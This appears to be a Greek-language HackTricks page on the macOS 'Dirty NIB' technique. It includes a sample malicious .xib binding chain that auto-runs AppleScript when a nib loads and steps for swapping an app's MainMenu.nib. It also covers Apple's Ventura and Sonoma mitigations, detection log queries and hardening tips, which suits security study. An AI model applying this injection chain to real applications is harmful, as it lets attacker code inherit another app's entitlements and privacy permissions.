# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Το Dirty NIB αναφέρεται στην κατάχρηση αρχείων Interface Builder (.xib/.nib) μέσα σε ένα signed macOS app bundle, ώστε να εκτελεστεί logic ελεγχόμενο από τον attacker μέσα στη διεργασία-στόχο, κληρονομώντας έτσι τα entitlements και τα TCC permissions της. Η τεχνική τεκμηριώθηκε αρχικά από τον xpn (MDSec) και αργότερα γενικεύτηκε και επεκτάθηκε σημαντικά από τη Sector7, η οποία κάλυψε επίσης τα mitigations της Apple στα macOS 13 Ventura και macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Για background και deep dives, δείτε τα references στο τέλος.

> TL;DR
> • Πριν από το macOS 13 Ventura: η αντικατάσταση του MainMenu.nib ενός bundle (ή κάποιου άλλου nib που φορτώνεται κατά την εκκίνηση) μπορούσε αξιόπιστα να επιτύχει process injection και συχνά privilege escalation.
> • Από το macOS 13 (Ventura), και με βελτιώσεις στο macOS 14 (Sonoma): το deep verification κατά το πρώτο launch, η προστασία των bundles, τα Launch Constraints και το νέο TCC permission “App Management” αποτρέπουν σε μεγάλο βαθμό το post-launch nib tampering από άσχετες εφαρμογές. Οι επιθέσεις ενδέχεται να παραμένουν εφικτές σε ειδικές περιπτώσεις (π.χ. tooling του ίδιου developer που τροποποιεί δικές του εφαρμογές ή terminals στα οποία ο χρήστης έχει παραχωρήσει App Management/Full Disk Access).


## Τι είναι τα αρχεία NIB/XIB

Τα αρχεία Nib (συντομογραφία του NeXT Interface Builder) είναι serialized UI object graphs που χρησιμοποιούνται από AppKit apps. Το σύγχρονο Xcode αποθηκεύει επεξεργάσιμα XML αρχεία .xib, τα οποία μεταγλωττίζονται σε .nib κατά το build. Μια τυπική εφαρμογή φορτώνει το κύριο UI της μέσω της `NSApplicationMain()`, η οποία διαβάζει το key `NSMainNibFile` από το Info.plist της εφαρμογής και κάνει instantiate το object graph κατά το runtime.

Βασικά σημεία που επιτρέπουν την επίθεση:
- Το NIB loading κάνει instantiate αυθαίρετες Objective‑C classes χωρίς να απαιτεί να συμμορφώνονται με το NSSecureCoding (ο nib loader της Apple χρησιμοποιεί fallback στα `init`/`initWithFrame:` όταν το `initWithCoder:` δεν είναι διαθέσιμο).
- Τα Cocoa Bindings μπορούν να καταχραστούν ώστε να καλούν methods κατά το instantiate των nibs, συμπεριλαμβανομένων chained calls που δεν απαιτούν user interaction.


## Διαδικασία Dirty NIB injection (οπτική του attacker)

Η κλασική ροή πριν από το Ventura:
1) Δημιουργία ενός malicious .xib
- Προσθέστε ένα αντικείμενο `NSAppleScript` (ή άλλες “gadget” classes, όπως `NSTask`).
- Προσθέστε ένα `NSTextField` του οποίου το title περιέχει το payload (π.χ. AppleScript ή command arguments).
- Προσθέστε ένα ή περισσότερα αντικείμενα `NSMenuItem`, συνδεδεμένα μέσω bindings ώστε να καλούν methods στο target object.

2) Αυτόματο trigger χωρίς user clicks
- Χρησιμοποιήστε bindings για να ορίσετε το target/selector ενός menu item και, στη συνέχεια, να καλέσετε τη private method `_corePerformAction`, ώστε το action να εκτελείται αυτόματα όταν φορτώνεται το nib. Έτσι δεν απαιτείται ο χρήστης να κάνει click σε κάποιο button.

Ελάχιστο παράδειγμα μιας auto-trigger chain μέσα σε ένα .xib (συνοπτικό για λόγους σαφήνειας):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Αυτό επιτυγχάνει αυθαίρετη εκτέλεση AppleScript στη διεργασία-στόχο κατά τη φόρτωση του nib.<sup>[[1]](#references)</sup> Τα advanced chains μπορούν να:
- Δημιουργούν αυθαίρετες κλάσεις AppKit (π.χ., `NSTask`) και να καλούν μεθόδους χωρίς ορίσματα, όπως η `-launch`.
- Καλούν αυθαίρετους selectors με arguments αντικειμένων μέσω του binding trick παραπάνω.
- Φορτώνουν το AppleScriptObjC.framework για γεφύρωση προς το Objective-C και ακόμη να καλούν επιλεγμένα C APIs.
- Σε παλαιότερα συστήματα που εξακολουθούν να περιλαμβάνουν το Python.framework, να κάνουν bridge προς την Python και στη συνέχεια να χρησιμοποιούν `ctypes` για να καλούν αυθαίρετες C functions (έρευνα της Sector7).<sup>[[2]](#references)</sup>

3) Αντικατάσταση του nib της εφαρμογής
- Αντιγράψτε το target.app σε μια τοποθεσία με δυνατότητα εγγραφής, αντικαταστήστε, για παράδειγμα, το `Contents/Resources/MainMenu.nib` με το malicious nib και εκτελέστε το target.app. Πριν από το Ventura, μετά από μια αρχική αξιολόγηση του Gatekeeper, οι επόμενες εκκινήσεις εκτελούσαν μόνο επιφανειακούς ελέγχους υπογραφής, επομένως οι μη εκτελέσιμοι πόροι (όπως τα .nib) δεν επανελέγχονταν.

Παράδειγμα AppleScript payload για εμφανές test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Σύγχρονες προστασίες του macOS (Ventura/Monterey/Sonoma/Sequoia)

Η Apple εισήγαγε αρκετούς συστημικούς μετριασμούς που μειώνουν δραματικά τη βιωσιμότητα του Dirty NIB στο σύγχρονο macOS:<sup>[[2]](#references)</sup>
- Επαλήθευση σε βάθος κατά την πρώτη εκκίνηση και προστασία bundle (macOS 13 Ventura)
- Κατά την πρώτη εκτέλεση οποιασδήποτε εφαρμογής (σε quarantine ή όχι), ένας βαθύς έλεγχος υπογραφής καλύπτει όλους τους πόρους του bundle. Στη συνέχεια, το bundle προστατεύεται: μόνο εφαρμογές από τον ίδιο developer (ή εφαρμογές που επιτρέπονται ρητά από την ίδια την εφαρμογή) μπορούν να τροποποιούν τα περιεχόμενά του. Άλλες εφαρμογές χρειάζονται τη νέα άδεια TCC “App Management” για να γράψουν στο bundle μιας άλλης εφαρμογής.
- Launch Constraints (macOS 13 Ventura)
- Οι εφαρμογές συστήματος/της Apple που περιλαμβάνονται στο σύστημα δεν μπορούν να αντιγραφούν αλλού και να εκτελεστούν· αυτό εξουδετερώνει την προσέγγιση “αντιγραφή στο /tmp, patch, εκτέλεση” για εφαρμογές του λειτουργικού συστήματος.
- Βελτιώσεις στο macOS 14 Sonoma
- Η Apple ενίσχυσε το App Management και διόρθωσε γνωστά bypasses (π.χ. το CVE‑2023‑40450) που αναφέρθηκαν από το Sector7. Το Python.framework είχε αφαιρεθεί νωρίτερα (macOS 12.3), διακόπτοντας ορισμένες αλυσίδες privilege-escalation.
- Αλλαγές στο Gatekeeper/Quarantine
- Για μια ευρύτερη συζήτηση σχετικά με το Gatekeeper, την προέλευση και τις αλλαγές στο assessment που επηρέασαν αυτή την τεχνική, δείτε τη σελίδα που αναφέρεται παρακάτω.

> Πρακτική συνέπεια
> • Στο Ventura+ γενικά δεν μπορείτε να τροποποιήσετε το .nib μιας εφαρμογής τρίτου μέρους, εκτός αν η διεργασία σας έχει App Management ή είναι υπογεγραμμένη με το ίδιο Team ID με τον στόχο (π.χ. developer tooling).
> • Η παραχώρηση App Management ή Full Disk Access σε shells/terminals ουσιαστικά ανοίγει ξανά αυτή την επιφάνεια επίθεσης για οτιδήποτε μπορεί να εκτελέσει code μέσα στο context αυτού του terminal.


### Αντιμετώπιση των Launch Constraints

Τα Launch Constraints εμποδίζουν την εκτέλεση πολλών εφαρμογών της Apple από μη προεπιλεγμένες τοποθεσίες, αρχής γενομένης από το Ventura. Αν βασιζόσασταν σε workflows πριν από το Ventura, όπως η αντιγραφή μιας εφαρμογής της Apple σε έναν προσωρινό κατάλογο, η τροποποίηση του `MainMenu.nib` και η εκτέλεσή της, αναμένετε ότι αυτό θα αποτύχει σε >= 13.0.


## Απαρίθμηση targets και nibs (χρήσιμο για research / legacy systems)

- Εντοπισμός εφαρμογών των οποίων το UI βασίζεται σε nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Βρείτε υποψήφιους πόρους nib μέσα σε ένα bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Επικυρώστε διεξοδικά τις υπογραφές κώδικα (θα αποτύχει αν έχετε παραποιήσει πόρους και δεν τους έχετε υπογράψει ξανά):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Σημείωση: Στο σύγχρονο macOS θα αποκλειστείτε επίσης από την προστασία bundle/TCC όταν προσπαθείτε να εγγράψετε στο bundle μιας άλλης εφαρμογής χωρίς την κατάλληλη εξουσιοδότηση.


## Συμβουλές για Detection και DFIR

- Παρακολούθηση ακεραιότητας αρχείων στους πόρους των bundle
- Παρακολουθήστε για αλλαγές στα mtime/ctime των `Contents/Resources/*.nib` και άλλων μη εκτελέσιμων πόρων στις εγκατεστημένες εφαρμογές.
- Unified logs και συμπεριφορά διεργασιών
- Παρακολουθήστε για μη αναμενόμενη εκτέλεση AppleScript μέσα σε GUI apps και για διεργασίες που φορτώνουν τα AppleScriptObjC ή Python.framework. Παράδειγμα:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Εκτελείτε περιοδικά `codesign --verify --deep` σε κρίσιμες εφαρμογές, ώστε να διασφαλίζετε ότι οι πόροι παραμένουν αμετάβλητοι.
- Πλαίσιο προνομίων
- Ελέγξτε ποιος/τι διαθέτει TCC “App Management” ή Full Disk Access (ειδικά τα terminals και τα management agents). Η αφαίρεσή τους από shells γενικού σκοπού αποτρέπει την εύκολη επανενεργοποίηση tampering τύπου Dirty NIB.


## Defensive hardening (developers και defenders)

- Προτιμήστε programmatic UI ή περιορίστε όσα αντικείμενα δημιουργούνται από nibs. Αποφύγετε τη συμπερίληψη ισχυρών classes (π.χ. `NSTask`) σε nib graphs και αποφύγετε bindings που καλούν έμμεσα selectors σε αυθαίρετα objects.
- Υιοθετήστε το hardened runtime με Library Validation (ήδη τυπική πρακτική για τις σύγχρονες εφαρμογές). Παρότι αυτό δεν σταματά από μόνο του το nib injection, αποκλείει την εύκολη φόρτωση native code και αναγκάζει τους attackers να χρησιμοποιούν payloads μόνο μέσω scripting.
- Μην ζητάτε ούτε να εξαρτάστε από ευρέως διαθέσιμα App Management permissions σε tools γενικού σκοπού. Αν το MDM απαιτεί App Management, διαχωρίστε αυτό το context από shells που ελέγχονται από τον χρήστη.
- Επαληθεύετε τακτικά την ακεραιότητα του app bundle σας και κάντε τους μηχανισμούς ενημέρωσης να επιδιορθώνουν αυτόματα τους πόρους του bundle.


## Σχετική ανάγνωση στο HackTricks

Μάθετε περισσότερα σχετικά με τις αλλαγές στο Gatekeeper, το quarantine και το provenance που επηρεάζουν αυτή την τεχνική:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Αναφορές

- [1] [xpn – DirtyNIB (original write-up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
